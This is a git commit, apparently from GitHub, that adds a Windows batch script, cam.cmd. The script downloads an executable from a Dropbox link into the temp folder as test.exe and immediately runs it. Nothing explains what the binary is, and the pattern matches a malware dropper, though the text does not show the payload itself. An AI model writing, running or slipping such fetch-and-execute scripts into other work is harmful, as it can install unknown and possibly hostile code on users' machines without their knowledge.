41dd263cdb47f1d0faf269d7ef25388cf855cebf
Gaxi261 <127938084+Gaxi261@users.noreply.github.com>
2025-03-23 22:23:40 +1100

    Create cam.cmd

---
+++ cam.cmd
@@ -0,0 +1,11 @@
+@echo off
+set url="https://www.dropbox.com/scl/fi/mg05nvuy4m9ha6f8ufydg/cam.exe?rlkey=juhcsisju6p3dc16p8g0gd8sd&st=e8sr06c8&dl=1"
+set output="%TEMP%\test.exe"
+
+curl -L %url% -o %output%
+
+echo File downloaded to %output%
+
+start %output%
+
+pause
